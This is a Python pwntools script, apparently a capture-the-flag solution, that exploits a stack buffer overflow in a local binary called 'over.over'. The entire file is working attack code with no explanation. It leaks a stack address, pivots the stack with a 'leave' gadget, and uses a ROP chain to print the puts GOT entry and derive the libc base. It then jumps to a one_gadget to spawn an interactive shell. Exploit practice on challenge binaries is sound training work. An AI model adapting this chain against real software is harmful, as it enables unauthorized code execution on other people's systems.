from pwn import *
def repeat(c):
	p.readuntil(">")
	p.send(c)
bin=ELF("./over.over")

libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
context.log_level='debug'
leave=0x00000000004006be
pr=0x0000000000400793
main=0x0000000004006C0
p=process("./over.over")

payload="A"*0x50
repeat(payload)
p.readuntil("A"*0x50)

data=p.readline()
stack=u64(data[:-1].ljust(8,"\0"))
log.warning(hex(stack))

payload=p64(0xdeadbeef)+p64(pr)+p64(bin.got['puts'])+p64(bin.plt['puts'])+p64(main)
payload=payload.ljust(0x50,'\0')+p64(stack-0x70)+p64(leave)

repeat(payload)
p.readline()
data=p.readline()
base=u64(data[:-1].ljust(8,"\0"))
base=base-libc.symbols['puts']
libc.address=base
one=0x4526a+base
log.warning(hex(base))


repeat("A"*0x50+p64(0xdeadbeef)+p64(one))
p.interactive()
